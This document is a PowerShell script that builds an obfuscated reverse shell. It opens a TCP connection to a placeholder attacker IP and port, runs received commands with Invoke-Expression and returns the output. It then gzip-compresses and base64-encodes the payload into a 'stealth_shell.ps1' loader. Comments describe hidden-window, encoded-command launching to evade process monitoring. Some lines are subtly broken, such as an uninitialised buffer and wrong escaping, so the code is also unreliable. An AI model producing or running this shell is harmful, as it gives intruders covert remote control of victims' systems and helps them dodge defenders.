$IP = "PLACEHOLDER_IP"
$PORT = "PLACEHOLDER_PORT"
$Command = @"
`$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);
`$stream = `$client.GetStream();
`$sendbytes = ([system.text.encoding]::ASCII).GetBytes('PS ' + (pwd).Path + '> ');
`$stream.Write(`$sendbytes,0,`$sendbytes.Length);
`$bytes = 0;
while((`$bytes = `$stream.Read(`$buffer, 0, `$buffer.Length)) -ne 0) {
    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$buffer,0, `$bytes);
    try {
        `$sendback = (Invoke-Expression -Command `$data 2>&1 | Out-String);
    } catch {
        `$sendback = `$_.Exception.Message | Out-String;
    }
    `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
    `$sendbyte = ([system.text.encoding]::ASCII).GetBytes(`$sendback2);
    `$stream.Write(`$sendbyte,0,`$sendbyte.Length);
    `$stream.Flush();
}
`$client.Close();
"@

$Compressed = [System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new((`$Command | Out-String | % { [System.Text.Encoding]::UTF8.GetBytes($_) })), [System.IO.Compression.CompressionMode]::Compress)
$MemStream = [System.IO.MemoryStream]::new()
$Compressed.CopyTo($MemStream)
$EncodedPayload = [System.Convert]::ToBase64String($MemStream.ToArray())

$FinalCommand = @"
\$S = new-object IO.MemoryStream;
\$B = [Convert]::FromBase64String('$EncodedPayload');
\$S.Write(\$B, 0, \$B.Length);
\$S.Seek(0, 0);
\$G = new-object IO.Compression.GzipStream(\$S, [IO.Compression.CompressionMode]::Decompress);
\$R = new-object IO.StreamReader(\$G);
\$C = \$R.ReadToEnd();
IEX \$C
"@

$FinalCommand | Out-File -Encoding ASCII .\stealth_shell.ps1
# To make this harder to detect, we use the -EncodedCommand parameter which hides the script content from process command-line monitoring
# This is the launch command that is typically compiled into an executable wrapper in high-stakes training simulations:
# powershell.exe -NoP -NonI -WindowStyle Hidden -EncodedCommand <Base64 of $FinalCommand>
# PLACEHOLDER_IP and PLACEHOLDER_PORT must be replaced before execution.
